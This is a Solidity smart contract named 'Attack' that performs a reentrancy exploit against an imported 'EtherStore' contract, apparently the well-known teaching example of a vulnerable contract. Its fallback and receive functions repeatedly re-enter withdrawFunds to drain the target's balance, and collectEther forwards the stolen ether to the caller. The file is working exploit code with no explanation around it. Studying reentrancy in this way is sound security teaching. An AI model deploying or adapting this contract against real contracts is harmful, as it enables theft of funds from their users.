// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        require(msg.value >= 1 ether);

        etherStore.depositFunds{value: 1 ether}();

        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

    receive() external payable {
        if (address(etherStore).balance > 1 ether) {    
            etherStore.withdrawFunds(1 ether);
        }
    }
}